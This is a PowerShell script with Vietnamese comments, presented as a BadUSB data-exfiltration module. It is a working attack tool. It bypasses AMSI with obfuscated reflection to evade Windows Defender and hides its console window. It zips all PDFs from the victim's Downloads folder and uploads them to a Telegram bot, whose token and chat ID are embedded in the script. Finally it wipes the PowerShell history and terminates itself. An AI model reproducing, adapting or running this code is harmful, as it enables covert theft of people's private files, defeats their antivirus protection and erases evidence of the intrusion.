<# 
=================================================================================================
PROJECT: PHYSICAL ACCESS EXPLOITATION (BADUSB)
MODULE: DATA EXFILTRATION v3.0 (BYPASS SEC)
=================================================================================================
#>
param($h = 'y')

# --- PHẦN 1: SIÊU LÀM RỐI AMSI BYPASS ---
# Chia nhỏ các từ khóa 'AmsiUtils' và 'amsiInitFailed' để Defender không nhận diện được
try {
    $s1 = 'System.Management.Automation.'
    $s2 = 'A' + 'm' + 'si' + 'Ut' + 'ils'
    $f1 = 'a' + 'm' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed'
    
    $u = [Ref].Assembly.GetType($s1 + $s2)
    $b = $u.GetField($f1, 'NonPublic,Static')
    $b.SetValue($null, $true)
} catch { }

# --- PHẦN 2: TỰ ĐỘNG ẨN CỬA SỔ (STEALTH) ---
if($h -eq 'y'){
    $m = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $t = Add-Type -MemberDefinition $m -Name ("W" + (Get-Random)) -PassThru
    [void]$t::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0)
}

# --- PHẦN 3: CẤU HÌNH TELEGRAM (LÀM RỐI URL) ---
$k1 = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$k2 = "8312702210"
$u1 = "h" + "tt" + "ps" + "://" + "ap" + "i." + "te" + "le" + "gr" + "am" + ".or" + "g/bo" + "t"
$url = $u1 + $k1 + "/sendDocument"

# --- PHẦN 4: THU THẬP PDF (CHỈ LẤY FILE NGOÀI CÙNG DOWNLOADS) ---
$p1 = Join-Path $env:USERPROFILE ("D" + "ownloads")
$z = Join-Path $env:TEMP ("sys_" + (Get-Random) + ".zip")

Add-Type -AssemblyName ("System.IO.Compression." + "FileSystem")

if (Test-Path $p1) {
    # Lọc chặt chẽ chỉ lấy đuôi .pdf
    $f = Get-ChildItem -Path $p1 -File | Where-Object { $_.Extension -eq (".p" + "df") }

    if ($f.Count -gt 0) {
        $zip = [System.IO.Compression.ZipFile]::Open($z, 'Create')
        foreach ($file in $f) {
            try {
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $file.FullName, $file.Name)
            } catch { continue }
        }
        $zip.Dispose()

        # GỬI DỮ LIỆU QUA CURL (CÓ SẴN TRÊN WINDOWS)
        if (Test-Path $z) {
            curl.exe -X POST $url -F ("chat_id=" + $k2) -F ("document=@" + $z) | Out-Null
            Remove-Item $z -Force
        }
    }
}

# --- PHẦN 5: XÓA DẤU VẾT CUỐI CÙNG ---
$h_path = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $h_path) { Remove-Item $h_path -Force -ErrorAction SilentlyContinue }

# Tự kết thúc tiến trình
Stop-Process -Id $pid -Force
